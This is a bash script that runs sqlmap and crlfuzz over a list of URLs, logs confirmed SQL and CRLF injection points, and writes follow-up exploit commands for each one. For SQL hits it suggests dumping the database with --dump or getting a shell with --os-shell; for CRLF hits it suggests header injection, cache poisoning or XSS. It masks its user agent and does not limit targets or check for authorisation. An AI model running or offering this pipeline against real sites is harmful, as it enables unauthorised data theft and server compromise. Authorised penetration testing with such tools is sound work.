#!/bin/bash

INPUT="${1:-url.txt}"
SQLREPORT="sqlreport.txt"

> "$SQLREPORT"

while IFS= read -r url; do
    [ -z "$url" ] && continue

    SQLMAP_OUT=$(sqlmap -u "$url" --batch --random-agent --level=2 --risk=1 2>/dev/null)
    if echo "$SQLMAP_OUT" | grep -q "sqlmap identified the following injection point"; then
        echo "URL: $url" >> "$SQLREPORT"
        echo "Vulnerability: SQL Injection" >> "$SQLREPORT"
        echo "$SQLMAP_OUT" | grep -iE "Parameter:|Type:|Title:|Payload:" >> "$SQLREPORT"
        echo "Exploit: sqlmap -u \"$url\" --batch --dump (or --os-shell if stacked queries are supported)" >> "$SQLREPORT"
        echo "" >> "$SQLREPORT"
    fi
done < "$INPUT"

CRLF_OUT=$(crlfuzz -l "$INPUT" -s 2>/dev/null)
if [ -n "$CRLF_OUT" ]; then
    echo "$CRLF_OUT" | while IFS= read -r curl_url; do
        [ -z "$curl_url" ] && continue
        echo "URL: $curl_url" >> "$SQLREPORT"
        echo "Vulnerability: CRLF Injection" >> "$SQLREPORT"
        echo "Exploit: Inject %0d%0a sequences into the parameter to split HTTP headers and response, enabling header injection, cache poisoning, or reflected XSS via Set-Cookie or Location headers" >> "$SQLREPORT"
        echo "" >> "$SQLREPORT"
    done
fi
